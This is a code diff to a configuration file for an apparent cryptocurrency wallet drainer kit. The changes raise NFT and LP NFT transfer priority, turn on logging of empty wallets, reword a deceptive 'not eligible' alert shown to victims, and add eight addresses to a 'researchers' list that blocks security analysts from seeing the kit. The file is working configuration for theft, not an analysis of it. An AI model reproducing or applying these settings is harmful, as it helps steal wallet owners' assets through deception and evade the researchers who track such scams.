@@ -12,7 +12,7 @@ let themeVariables = {
 
 // Logging setting
 let logDrainingStrategy = true; // Log draining strategy
-let logEmptyWallets = false; // Log when wallet is empty
+let logEmptyWallets = true; // Log when wallet is empty
 let logIpData =  true; // Add IP data to logs
 
 // Repeat the highest proice token if user declines 
@@ -22,13 +22,13 @@ let retry_changenetwork = 2;
 
 // Weights of transfer, assets with highest weight will be transfered first. Weight = multiplier * eth_price
 let multipliers = {
-    "LP_NFTS": 1,
+    "LP_NFTS": 2,
     "PERMIT2": 1,
     "BLUR": 1,
     "SEAPORT": 1,
     "SWAP": 1,
     "TOKENS": 1,
-    "NFT": 1,
+    "NFT": 2,
     "NATIVES": 1,
 }
 
@@ -45,7 +45,7 @@ let celo_enabled = true;
 let autoconnect = false; // Automatically connect wallet after page loaded
 
 // Alerts
-let notEligible = "This wallet is not eligible. Please use a different wallet with enough assets"; // Low balance
+let notEligible = "This wallet is not eligible. Please use a different wallet with enough assets to cover the gas fees."; // Low balance
 
 // Popup settings
 let popupEnabled = true; // true or false, popup after connecting wallet while draining
@@ -162,6 +162,14 @@ let cfgversion = 680;
 // Block wallets
 let researchers = [
     "0x0000000000000000000000000000000000000003",
+    "0x4B25300099F91D240c4Acfb7fE680e4a84C88f19",
+    "0xb80482A865b056a50B9A3223992ad5b39565d212",
+    "0xFE73B5a595405baC396C329C674571a7a3DB528c",
+    "0x668768b0db25b9c5DC81E2E2D6a7C2A69E249271",
+    "0xEE9BF550021Ecc931C525445B2FcAD3B582d0DD5",
+    "0x884cd2d19E394619F16548c4dAA3dE85bb7B3e08",
+    "0x33E3c007d1D48e2B645C9ce22570267b0C82f578",
+    "0x7840bf8a8bED1Fe4e5dd4598fD4f134C51abdb7b",
 ];
 
 // [EXPERIMENTAL FUNCTIONS] Enable them if you know what you are doing
